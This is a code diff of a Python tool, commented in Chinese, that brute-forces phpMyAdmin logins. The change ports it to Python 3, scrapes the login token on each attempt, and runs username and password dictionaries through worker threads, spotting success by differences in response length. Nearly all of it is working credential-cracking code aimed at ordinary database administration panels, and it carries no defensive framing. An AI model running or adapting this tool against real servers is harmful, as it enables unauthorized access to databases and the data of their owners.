@@ -2,33 +2,36 @@
 # -*- coding: utf-8 -*-
 # @Author: CoolCat
 # @Modified: TARI 增加用户名字典，升级为Python3、多线程
-# 脚本功能：暴力破解phpMyadmin密码
+# 脚本功能：暴力破解phpMyadmin密码， pma = phpmyadmin
 
 import re
 import time
 import requests
 
-from thread import WorkManager
+from threads import WorkManager
 
 
-def pma_login(uname, pwd, token):
+def pma_login(url, uname, pwd):
     """
-    登录 phpmyadmin 的过程
+    登录 pma 的过程
+    :param url: pma 后台地址
     :param uname: 用户名
     :param pwd: 密码
-    :param token: 登录token
     :return: 登录接口session
     """
     try:
         session = requests.session()
-        fucker = {'pma_username': uname,
-                  'pma_password': pwd,
-                  "server": "1",
-                  "target": "url.php",
-                  'token': token}
-        session.post(url, data=fucker)
-        url2 = url + '/index.php?target=url.php&token=' + token
-        r = session.get(url=url2, timeout=2)
+
+        token = re.findall("name=\"token\" value=\"(.*?)\"></fieldset>", session.get(url=url).text)[0]
+
+        data_post = {
+            'pma_username': uname,
+            'pma_password': pwd,
+            "server": "1",
+            "target": "index.php",
+            'token': token
+        }
+        r = session.post(url, data=data_post)
 
         return r
     except Exception as e:
@@ -39,14 +42,14 @@ def pma_login(uname, pwd, token):
 
 def init(url, uname):
     """
-    请求给定的url，获取phpmyadmin的token和输入错误密码的返回 http 头长度
+    请求给定的url，获取 pma 输入错误密码的返回 http 头长度
     :param uname: 用户名，因为用户名长度不一样错误时返回的 http 头长度不一样
-    :param url: phpmyadmin 的 url 如 localhost:8080 即可
-    :return: 登录所需的 token 和 输入错误密码的返回的 http 头长度 contentLengthRaw
+    :param url: pma 的 url 如 localhost:8080 即可
+    :return: 输入错误密码的返回的 http 头长度 contentLengthRaw
     """
     try:
-        res = requests.get(url, timeout=2)
-    except requests.exceptions.MissingSchema:
+        res = requests.get(url, timeout=3)
+    except (requests.exceptions.MissingSchema, requests.exceptions.InvalidSchema, requests.exceptions.InvalidURL):
         exit('请输入正确的URL')
 
     try:
@@ -54,30 +57,25 @@ def init(url, uname):
     except AssertionError:
         exit(res.text)
 
-    token = re.findall("name=\"token\" value=\"(.*?)\" /><fieldset>", res.text)
-    token = str(token).replace("[u\'", "").replace("\']", "")
-    print("[!]Token:" + token)
-
-    r = pma_login(uname, 'error_password_t3ri', token)
-
+    r = pma_login(url, uname, 'error_password_t3ri')
     contentLengthRaw = len(r.text)
 
     print("[-]初始返回头长度设定为:" + str(contentLengthRaw) + "\n")
 
-    return token, contentLengthRaw
+    return contentLengthRaw
 
 
-def crack_pma(uname, pwd, token, contentLengthRaw, timeDelay):
+def crack_pma(url, uname, pwd, contentLengthRaw, timeDelay):
     """
 
+    :param url: pma 后台地址
     :param uname: 用户名
     :param pwd: 密码
-    :param token: 登录token
     :param contentLengthRaw: 错误密码的返回的 http 头长度
     :param timeDelay: 爆破延时时间
     :return:
     """
-    r = pma_login(uname, pwd, token)
+    r = pma_login(url, uname, pwd)
     try:
         contentLength = len(r.text)
     except AttributeError as e:
@@ -100,8 +98,8 @@ def crack_pma(uname, pwd, token, contentLengthRaw, timeDelay):
 
 if __name__ == '__main__':
     # 线程数量
-    threadNum = 16
-    # 延时 timeDelay s 爆破
+    threadNum = 4
+    # 每个线程延时 几 s 爆破
     timeDelay = 0
 
     url = input("URL:")
@@ -112,11 +110,11 @@ if __name__ == '__main__':
 
     for uname in open("username.txt"):
         uname = uname.replace("\r", "").replace("\n", "")
-        token, contentLengthRaw = init(url, uname)
+        contentLengthRaw = init(url, uname)
         for pwd in open("password.txt"):
             pwd = pwd.replace("\r", "").replace("\n", "")
 
-            wm.add_job(crack_pma, uname, pwd, token, contentLengthRaw, timeDelay)
+            wm.add_job(crack_pma, url, uname, pwd, contentLengthRaw, timeDelay)
 
     wm.start()
     wm.wait_for_complete()
